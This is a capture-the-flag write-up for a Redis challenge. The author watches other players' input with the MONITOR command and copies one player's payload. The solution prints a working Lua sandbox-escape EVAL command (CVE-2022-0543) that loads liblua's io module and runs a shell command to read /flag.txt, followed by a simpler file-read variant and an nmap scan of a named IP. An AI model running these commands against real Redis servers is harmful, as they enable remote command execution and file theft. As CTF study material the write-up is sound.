# Flag
KCTF{c0n6r475_b015_n1c3_c47ch}

# Analysis
Based on the name of the challenge it can be assumed that the exploit is related to lua and the redis port 6379. During the CTF I was not able to find a proper exploit to exploit the port, however upon reading the manual for redis-cli I came upon a command that would be able to read the inputs that were being inputted by users of the port. Using this command which was `MONITOR` I was able to see other player's input.


# Solution
Upon analyzing the inputs of players I took notes of certain IPs that were trying different commands using eval. I assumed that when an IP stopped sending commands it would mean the command they had tried succeeded and they were able to capture the flag.
![image](https://github.com/user-attachments/assets/dddae828-00d0-40fd-ac92-6eb2dbda1cf9)

As you can see IP 109.120.149.149 stopped at this command so based on my earlier assumption it means this command should work.
![image](https://github.com/user-attachments/assets/74e5edc0-8c87-43f3-ae63-40c920f5ebe4)

I tested it on the server and it worked giving me the flag.
![image](https://github.com/user-attachments/assets/2221d2c1-5099-4141-b2c4-a5a28c6233bc)



CLI:
```
MONITOR


EVAL "local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"cat /flag.txt\", \"r\"); local res = f:read(\"*a\"); f:close(); return res" 0

```

# Other Solutions
```
EVAL "return io.open('/flag.txt'):read('*all')" 0 ###"KCTF{c0n6r475_b015_n1c3_c47ch}"
```

# Intended Solution
```
`nmap 172.105.121.246 -sV -p6379 -T4` -> `6379/tcp open redis Redis key-value store 5.0.7` -> [https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md "https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md") -> then `cat /*.txt` and you will get the flag ~~
```
